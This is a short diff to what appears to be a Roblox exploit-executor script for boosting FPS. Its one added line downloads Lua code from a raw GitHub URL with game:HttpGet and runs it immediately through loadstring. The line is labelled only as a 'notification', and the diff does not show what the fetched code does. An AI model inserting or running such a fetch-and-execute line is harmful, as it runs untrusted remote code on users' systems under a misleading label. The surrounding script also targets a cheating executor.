@@ -1,3 +1,4 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/710200999/notification/refs/heads/main/notification-F9-Key.lua")() -- notification
 getgenv().boostFPS = false -- // changing true to false will turn it off
 local vim = game:GetService("VirtualInputManager")
 setfpscap(5000)
